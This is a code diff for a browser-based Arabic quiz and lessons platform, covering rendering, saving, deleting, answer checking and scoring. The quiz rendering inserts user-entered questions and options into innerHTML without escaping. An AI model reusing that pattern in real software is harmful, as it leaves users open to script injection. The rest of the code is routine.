+        const quizBox = document.getElementById('quizzes-list');
+        quizBox.innerHTML = '';
+        quizzes.forEach((item, qIdx) => {
+            let optionsStr = '';
+            item.opts.forEach((opt, oIdx) => {
+                optionsStr += `
+                    <label class="quiz-opt">
+                        <input type="radio" name="q_${qIdx}" value="${oIdx}">
+                        <span>${opt}</span>
+                    </label>
+                `;
+            });
+
+            quizBox.innerHTML += `
+                <div class="card-item">
+                    <div class="card-item-title">
+                        <p style="font-weight: 700; color: #fff;">تحدي #${qIdx + 1}: ${item.q}</p>
+                        <button class="btn-danger" onclick="deleteQuiz(${qIdx})"><i class="fa-solid fa-trash"></i></button>
+                    </div>
+                    ${optionsStr}
+                    <button class="btn-primary" style="margin-top: 12px; padding: 10px; font-size: 0.85rem;" onclick="checkAnswer(${qIdx})">
+                        إرسال الحل
+                    </button>
+                </div>
+            `;
+        });
+    }
+
+    function saveNewLesson() {
+        const title = document.getElementById('add-lesson-title').value.trim();
+        const desc = document.getElementById('add-lesson-desc').value.trim();
+        const code = document.getElementById('add-lesson-code').value.trim();
+
+        if (!title || !desc) {
+            alert('برجاء كتابة عنوان الشرح والتفاصيل!');
+            return;
+        }
+
+        lessons.push({ title, desc, code });
+        saveStorage();
+
+        document.getElementById('add-lesson-title').value = '';
+        document.getElementById('add-lesson-desc').value = '';
+        document.getElementById('add-lesson-code').value = '';
+
+        alert('تم نشر الدرس بنجاح! 🔥');
+    }
+
+    function saveNewQuiz() {
+        const q = document.getElementById('add-quiz-q').value.trim();
+        const opt1 = document.getElementById('add-quiz-opt1').value.trim();
+        const opt2 = document.getElementById('add-quiz-opt2').value.trim();
+        const opt3 = document.getElementById('add-quiz-opt3').value.trim();
+
+        if (!q || !opt1 || !opt2) {
+            alert('برجاء كتابة السؤال والإجابة الصحيحة وخيار واحد إضافي على الأقل!');
+            return;
+        }
+
+        const opts = [opt1, opt2];
+        if (opt3) opts.push(opt3);
+
+        quizzes.push({ q, opts, ans: 0 });
+        saveStorage();
+
+        document.getElementById('add-quiz-q').value = '';
+        document.getElementById('add-quiz-opt1').value = '';
+        document.getElementById('add-quiz-opt2').value = '';
+        document.getElementById('add-quiz-opt3').value = '';
+
+        alert('تم نشر التحدي بنجاح! 🎯');
+    }
+
+    function deleteLesson(idx) {
+        if (confirm('تأكيد حذف هذا الدرس؟')) {
+            lessons.splice(idx, 1);
+            saveStorage();
+            renderPlatform();
+        }
+    }
+
+    function deleteQuiz(idx) {
+        if (confirm('تأكيد حذف هذا التحدي؟')) {
+            quizzes.splice(idx, 1);
+            saveStorage();
+            renderPlatform();
+        }
+    }
+
+    function checkAnswer(qIdx) {
+        const radios = document.getElementsByName(`q_${qIdx}`);
+        let chosen = -1;
+        radios.forEach(r => { if (r.checked) chosen = parseInt(r.value); });
+
+        if (chosen === -1) {
             alert('برجاء اختيار إجابة أولاً!');
             return;
         }
 
-        if (selectedValue === quizzes[qIndex].answer) {
-            alert('إجابة صحيحة! أحسنت 🎯🔥');
+        if (chosen === quizzes[qIdx].ans) {
+            userScore += 100;
+            document.getElementById('stat-score').innerText = userScore;
+            saveStorage();
+            alert('إجابة صحيحة! حصلت على +100 نقطة 🔥🎯');
         } else {
-            alert('إجابة خاطئة! حاول مرة أخرى ❌');
+            alert('إجابة خاطئة! حاول مجدداً ❌');
         }
     }
 
-    function escapeHtml(text) {
-        return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    function logout() {
+        document.getElementById('main-screen').classList.add('hidden');
+        document.getElementById('login-screen').classList.remove('hidden');
+    }
+
+    function escapeHTML(str) {
+        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
     }
 </script>
 
